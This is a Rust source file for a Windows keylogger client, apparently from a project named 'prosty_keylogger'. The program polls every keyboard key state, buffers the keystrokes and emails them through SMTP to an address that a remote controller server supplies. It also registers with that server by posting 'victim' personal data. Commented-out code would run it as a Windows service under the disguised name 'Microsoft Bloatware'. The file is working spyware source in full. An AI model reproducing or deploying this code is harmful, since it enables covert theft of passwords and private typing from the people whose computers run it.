mod options;

use std::{env, thread, time};
use std::env::Args;
use std::ffi::OsString;
use lettre::message::header::ContentType;
use lettre::{SmtpTransport, Transport};
use lettre::transport::smtp::authentication::Credentials;
use log::{debug, error, info, LevelFilter, trace};
use tokio::net::windows::named_pipe::PipeMode::Message;
use windows::UI::Core::CoreVirtualKeyStates;
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use std::fmt::Write;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};
use anyhow::Error;
use clap::Parser;
use reqwest::Url;
use serde_json::value::Index;
use windows_service::{define_windows_service, service_control_handler, service_dispatcher};
use windows_service::service::{ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType};
use windows_service::service_control_handler::ServiceControlHandlerResult;
use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, TaskConfiguration};
use crate::options::ClientArgs;
//CoreVirtualKeyStates

//pub const BUFF_SIZE: usize = 1024*128;
fn setup_logger(level: LevelFilter, path: Option<impl AsRef<Path>>) -> Result<(), fern::InitError> {
    let mut d = fern::Dispatch::new()
        .format(|out, message, record| {
            out.finish(format_args!(
                "[{} {} {}] {}",
                humantime::format_rfc3339_seconds(SystemTime::now()),
                record.level(),
                record.target(),
                message
            ))
        })
        .level(level);
        if let Some(p) = path{
            d = d.chain(fern::log_file(p)?);
        }
        d.chain(std::io::stdout())
        .apply()?;
    Ok(())
}

#[inline]
pub fn check_key() -> Vec<u8>{
    let mut v = Vec::with_capacity(8);
    for i in 0..255u8{
        unsafe{
            let state = GetAsyncKeyState(i as i32);
            if state == 1 || state ==  -32767{
                v.push(i)
            }
        }

    }
    v
}

fn send_mail(num: u32, values: Vec<u8>, config: &MailConfiguration, id: u64){
    let mut body: String = String::with_capacity(values.len() as usize *2 + 64);
    for v in values{
        write!(body, "{:02x}", v).unwrap();
    }

    let email = lettre::Message::builder()
        .from(config.mail_from.parse().unwrap())
        .to(config.mail_to.parse().unwrap())
        .subject(format!("R-{id:016x}-{}", num))
        .header(ContentType::TEXT_PLAIN)
        .body(body)
        .unwrap();
    let creds = Credentials::new(config.smtp_login.to_owned(), config.smtp_password.to_owned());

    let mailer = SmtpTransport::relay(&config.relay)
        .unwrap()
        .credentials(creds)
        .build();

    match mailer.send(&email){
        Ok(_) => {
            info!("Email sent successfully")
        }
        Err(e) => {
            error!("Could not send mail: {e:}")
        }
    }
}


fn send_report(num: u32, values: Vec<u8>, config: &TaskConfiguration) -> Result<(), anyhow::Error>{
    match config.report_config{
        ReportConfig::Mail(ref mail) => {send_mail(num, values, mail, config.id)}
    }
    Ok(())
}
async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
    let s = match personal_data{
        None => reqwest::get(url.to_owned()).await?.text().await?,
        Some(data) => {
            let client = reqwest::Client::new();
            let json = serde_json::to_string(&data)?;
            client.post(url.join("/hello")?).json(&data).send().await?.text().await?
        }
    };
    let t: TaskConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}

fn update_config(url: &Url,  personal_data: Option<&PersonalData>) -> Result<TaskConfiguration, anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;
    let config = rt.block_on(async{
    //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
    let config = get_config(url, personal_data).await?;
    return Ok::<TaskConfiguration, anyhow::Error>(config);

    })?;
    Ok(config)
}

fn persistent_try_update_config(url: &Url,  personal_data: Option<&PersonalData>) -> TaskConfiguration{
    loop {
        match update_config(&url, personal_data){
            Ok(config) => {
                return config;
            }
            Err(err) => {
                error!("Error downloading config: {err}");
                thread::sleep(Duration::from_secs(30));
            }
        }
    }
}



fn client(url: &Url) -> anyhow::Result<()>{
    let data = PersonalData{
        name: Some("Poor".into()),
        last_name: Some("Victim".into()),
        gender: Some(Gender::Male),
    };
    let config = persistent_try_update_config(&url, Some(&data));
    info!("{:?}", config);
    let milli = time::Duration::from_millis(config.probe_interval_milli as u64);
    let mut vec = Vec::with_capacity(config.capture_size as usize + 64);
    let mut num =1;

    loop{
        thread::sleep(milli);
        let mut keys = check_key();

        if !keys.is_empty(){
            trace!("{:02x?}", keys);
            vec.extend(keys);
            trace!("len = {}", vec.len());
        }


        if vec.len() > config.capture_size as usize {
            let mut send_vec = Vec::with_capacity(config.capture_size as usize + 64);
            std::mem::swap(&mut send_vec, &mut vec);
            send_report(num, send_vec, &config)?;
            num += 1;
        }

    }

}
/*
define_windows_service!(ffi_service_main, service_main);
fn service_main(arguments: Vec<OsString>){
    match run_service(arguments){
        Ok(_) => {}
        Err(err) => println!("Error in service: {err}")
    }


}

fn run_service(arguments: Vec<OsString>) -> anyhow::Result<()>{
    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Stop => {
                // Handle stop event and return control back to the system.
                ServiceControlHandlerResult::NoError
            }
            // All services must accept Interrogate even if it's a no-op.
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    //win_service_logger::init();
    let status_handle = service_control_handler::register("Microsoft Bloat", event_handler)?;
    let next_status = ServiceStatus {
        // Should match the one from system service registry
        service_type: ServiceType::OWN_PROCESS,
        // The new state
        current_state: ServiceState::Running,
        // Accept stop events when running
        controls_accepted: ServiceControlAccept::STOP,
        // Used to report an error when starting or stopping only, otherwise must be zero
        exit_code: ServiceExitCode::Win32(0),
        // Only used for pending states, otherwise must be zero
        checkpoint: 0,
        // Only used for pending states, otherwise must be zero
        wait_hint: Duration::default(),
        process_id: None,
    };

    // Tell the system that the service is running now
    //def_logger()?;
    status_handle.set_service_status(next_status)?;
    //def_logger()?;

    let args = ClientArgs::parse_from(arguments);

    let url = Url::parse(&args.assistant)?;
    client(&url)
}

 */

fn def_logger() -> anyhow::Result<()>{
    let p = PathBuf::from(env::var("LOCALAPPDATA")?);
    let p = p.join("temp/client.tmp");

    setup_logger(LevelFilter::Trace, Some(p.as_path()))?;
    Ok(())
}

fn logger_file(file_name: Option<impl AsRef<Path>>) -> anyhow::Result<Option<PathBuf>>{
    match file_name{
        None => Ok(None),
        Some(s) => {
            let p = PathBuf::from(env::var("LOCALAPPDATA")?);
            let p = p.join(format!("temp/{:?}", s.as_ref() ));
            Ok(Some(p))
        }
    }

}
//#[tokio::main]
fn main()  -> Result<(), anyhow::Error>{
    /*
    let args = ClientArgs::parse();


    //adres trzeba zmenić
    let url = Url::parse(&args.assistant)?;
    client(&url)


     */

    //def_logger()?;
    //win_service_logger::init();

    let args = ClientArgs::parse();
    let url = Url::parse(&args.assistant)?;

    let logger_file = logger_file(args.log_filename.as_ref())?;

    setup_logger(args.log_filter, logger_file)?;
    //logger_file(args.log_filename)
    info!("Connectiong to: {:?}", args.assistant);
    client(&url)?;
    /*
    if args.no_service{
        let url = Url::parse(&args.assistant)?;
        info!("Connectiong to: {:?}", args.assistant);
        client(&url)?;

    } else {
        service_dispatcher::start("Microsoft Bloatware", ffi_service_main)?;
    }

     */

    Ok(())




}
